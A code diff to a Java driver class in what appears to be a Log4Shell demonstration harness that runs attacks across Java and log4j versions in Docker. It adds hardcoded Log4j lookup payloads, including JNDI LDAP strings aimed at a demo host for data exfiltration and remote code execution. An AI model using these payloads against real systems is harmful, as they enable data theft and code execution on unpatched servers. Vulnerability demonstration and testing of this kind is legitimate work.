@@ -1,5 +1,7 @@
 package com.sonatype.demo.log4shell;
 
+import com.sonatype.demo.log4shelldemo.helpers.DockerEnvironment;
+import com.sonatype.demo.log4shelldemo.helpers.ProcessHelper;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import java.io.File;
@@ -17,19 +19,19 @@ public class Driver {
     private static final String fatjars ="-jar-with-dependencies.jar";
     public static final String ANYJAR = ".jar";
 
-
     private static final Logger log= LoggerFactory.getLogger(FrontEnd.class);
 
     private String runnerPath;
 
     private final Map<Integer, LogVersion> logVersions =new TreeMap<>();
+    private final Map<Integer, Attack> attacksByID =new HashMap<>();
     private final Map<String, LogVersion> logVersionsByName =new TreeMap<>();
     private final Map<String, JavaVersion> javaVersions =new LinkedHashMap<>();
     private final Map<String, SystemProperty> vmProperties =new HashMap<>();
     private final Map<String,Console> consoles=new HashMap<>();
     private final Set<String> localImages;
     private final Map<Integer,Hint> hints=new HashMap<>();
-    private final BlockingQueue<JavaVersionTestConfig> queue=new LinkedBlockingQueue<>();
+    private final BlockingQueue<GridTestConfiguration> queue=new LinkedBlockingQueue<>();
 
     public final ResultsStore rs=new ResultsStore();
 
@@ -42,14 +44,37 @@ public class Driver {
         c=new Console("dns");
         consoles.put("dns",c);
 
-        localImages=DockerProcessRunner.getLocalDockerImages();
+        localImages= DockerEnvironment.getLocalDockerImages();
+
         File config=new File("config");
         log.info(config.getAbsolutePath()+" == "+config.exists());
         loadJarPaths();
         loadJavaLevels(config);
+        loadAttacks();
         loadHints(config);
         loadVMProperties();
         launcherRunner();
+
+
+    }
+
+    private void loadAttacks() {
+
+        addAttack(new Attack("expose java version","${sys:java.version}"));
+        addAttack(new Attack("expose java classpath","${sys:java.class.path}"));
+        addAttack(new Attack("expose envvar value","${env:MODE}"));
+        addAttack(new Attack("expose log4j config","${log4j:configLocation}"));
+
+        addAttack(new Attack("transmit java version","${jndi:ldap://ldap.dev:1389/cn=version}","sent us","sent us ${sys:java.version}"));
+        addAttack(new Attack("gadget chain","${jndi:ldap://ldap.dev:1389/cn=gadget}","gadget-chain","cannot be cast"));
+        addAttack(new Attack("remote code execution","${jndi:ldap://ldap.dev:1389/cn=rce}","XXX","Reference Class Name:"));
+        addAttack(new Attack("hidden attack","${jndi:ldap://ldap.dev:1389/a}","thank you for your data",new String[]{"cannot be cast","Reference Class Name:"}));
+    }
+
+    private void addAttack(Attack a) {
+        a.id=attacksByID.size()+1;
+        a.active=false;
+        attacksByID.put(a.id,a);
     }
 
     private void loadVMProperties() {
@@ -86,7 +111,7 @@ public class Driver {
     docker and java command
 
      */
-    private void driveJavaImages(JavaVersionTestConfig gdc) {
+    private void driveJavaImages(GridTestConfiguration gdc) {
 
 
         try {
@@ -120,16 +145,13 @@ public class Driver {
 
         File config=new File(c,"javalevels.txt");
         List<String> lines=Files.readAllLines(config.toPath());
-        boolean oneReady=false;
+
         for(String s:lines) {
             s=s.trim();
             JavaVersion jv=new JavaVersion(s);
             boolean present=localImages.contains(s);
             if(present) {
-                if (javaVersions.isEmpty()) {
-                    jv.active = true;
-                    oneReady = true;
-                }
+                jv.active = false;
                 javaVersions.put(jv.version, jv);
                 rs.addJavaVersion(jv);
             } else{
@@ -159,12 +181,14 @@ public class Driver {
     }
 
     public  int drive(String logMsg) {
-        List<String> s=new LinkedList<>();
-        s.add(logMsg);
-        return drive(s);
+        List<Attack> attacks=new LinkedList<>();
+        Attack a=new Attack("adhoc",logMsg);
+        attacks.add(a);
+        return drive(attacks);
     }
 
- public  int drive(List<String> logMsgs) {
+ public  int drive(List<Attack> attacks) {
+
 
         int scheduled=0;
 
@@ -186,7 +210,7 @@ public class Driver {
 
      for (JavaVersion jv : javaVersions.values()) {
          if(jv.active){
-             JavaVersionTestConfig gdc=new JavaVersionTestConfig(jv,active,props,logMsgs);
+             GridTestConfiguration gdc=new GridTestConfiguration(jv,active,props,attacks);
              scheduled+=active.size();
              queue.add(gdc);
 
@@ -196,9 +220,6 @@ public class Driver {
         return scheduled;
 
     }
-
-
-
 
 
     private void loadJarPaths() throws IOException {
@@ -243,8 +264,7 @@ public class Driver {
             String name=f.getName();
             String version=name.substring(0,name.length()- fatjars.length());
             LogVersion lv=new LogVersion(version,relLoc(current,f));
-            if(logVersions.isEmpty()) lv.active=true;  // activate the first one only
-
+            lv.active=false;
             logVersions.put(lv.getId(),lv);
             logVersionsByName.put(lv.getVersion(),lv);
 
@@ -307,6 +327,17 @@ public class Driver {
         return false;
 
     }
+
+
+    public boolean toggleActionStatus(int id) {
+        if(attacksByID.containsKey(id)) {
+           Attack a=attacksByID.get(id);
+            a.active=!a.active;
+            return a.active;
+        }
+        return false;
+    }
+
     public boolean togglePropertyStatus(String key) {
 
         if(vmProperties.containsKey(key)) {
@@ -342,7 +373,15 @@ public class Driver {
             }
         }
 
-        scheduled+=drive(msgs);
+        List<Attack> attacks=new LinkedList<>();
+        for(Attack a:attacksByID.values()) {
+            if(a.active) {
+                attacks.add(a);
+            }
+        }
+
+
+        scheduled+=drive(attacks);
 
        log.info("Scheduled {} grid tests",scheduled);
     }
@@ -379,4 +418,9 @@ public class Driver {
     public Collection<SystemProperty> getVMProperties() {
         return vmProperties.values();
     }
+
+    public Collection<Attack> getAttacks() {
+        return attacksByID.values();
+    }
+
 }
